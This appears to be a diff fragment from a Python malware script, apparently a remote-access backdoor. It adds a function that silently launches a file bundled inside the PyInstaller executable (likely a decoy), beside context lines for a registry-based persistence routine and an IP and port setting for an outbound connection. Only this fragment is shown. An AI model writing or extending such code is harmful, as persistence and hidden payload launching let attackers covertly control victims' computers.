@@ -69,6 +69,13 @@ def add_persistence():
         subprocess.call(regedit_command, shell=True)
 
 
+def open_added_file():
+    added_file_path = sys._MEIPASS + "\\"
+    subprocess.Popen(added_file_path, shell=True)
+
+
+open_added_file()
+
 add_persistence()
 IPAddr = ""
 Port = 8080
